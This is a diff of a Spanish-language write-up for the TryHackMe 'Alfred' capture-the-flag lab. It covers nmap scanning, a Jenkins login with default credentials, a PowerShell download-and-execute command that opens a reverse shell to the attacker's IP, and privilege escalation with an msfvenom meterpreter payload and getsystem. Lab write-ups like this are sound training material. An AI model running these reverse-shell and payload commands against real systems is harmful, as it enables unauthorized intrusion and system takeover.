@@ -1,8 +1,10 @@
-# TryHackMe
+# Alfred
 
 Windows
 
-## Nmap
+## Enumeration
+
+### Nmap
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.187.139 -oG allPorts
@@ -19,10 +21,12 @@ PORT     STATE SERVICE    VERSION
 | http-methods: 
 |_  Potentially risky methods: TRACE
 |_http-title: Site doesn't have a title (text/html).
+
 3389/tcp open  tcpwrapped
 | ssl-cert: Subject: commonName=alfred
 | Not valid before: 2025-06-29T10:49:57
 |_Not valid after:  2025-12-29T10:49:57
+
 8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
 |_http-title: Site doesn't have a title (text/html;charset=utf-8).
 | http-robots.txt: 1 disallowed entry 
@@ -30,9 +34,23 @@ PORT     STATE SERVICE    VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:**windows**
 ```
 
+### HTTP (80)
+
 ![alt text](image.png)
 
+### HTTP (8080)
+
+Credenciales por defecto `admin:admin`
+
 ![alt text](image-1.png)
+
+![alt text](image-13.png)
+
+## Exploit
+
+![alt text](image-14.png)
+
+Agregar la sigueinte linea de código
 
 ```powershell
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.244.36:8282/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.244.36 -Port 1234
@@ -55,7 +73,7 @@ PS C:\Users\bruce\Desktop> type user.txt
 79007a09481963edf2e1321abd9ae2a0
 ```
 
-## Escalar privilegios
+## Privilege Escalation
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.244.36 LPORT=5555 -f exe -o revshell.exe   
@@ -90,15 +108,14 @@ msf6 exploit(multi/handler) > run
 
 ![alt text](image-7.png)
 
-```powershell
-PS C:\Users\bruce\Desktop> cd 'C:\Program Fi
-les (x86)\Jenkins\workspace\admin'
+```shell
+PS C:\Users\bruce\Desktop> cd 'C:\Program Files (x86)\Jenkins\workspace\admin'
 PS C:\Program Files (x86)\Jenkins\workspace\admin> 
 ```
 
 ![alt text](image-8.png)
 
-```powershell
+```shell
 Start-Process revshell.exe
 ```
 
@@ -123,8 +140,7 @@ meterpreter > getsystem
 ![alt text](image-12.png)
 
 Flag: root.txt
-```bash
+
+```shell
 type C:\Windows\System32\config\root.txt
 ```
-
-
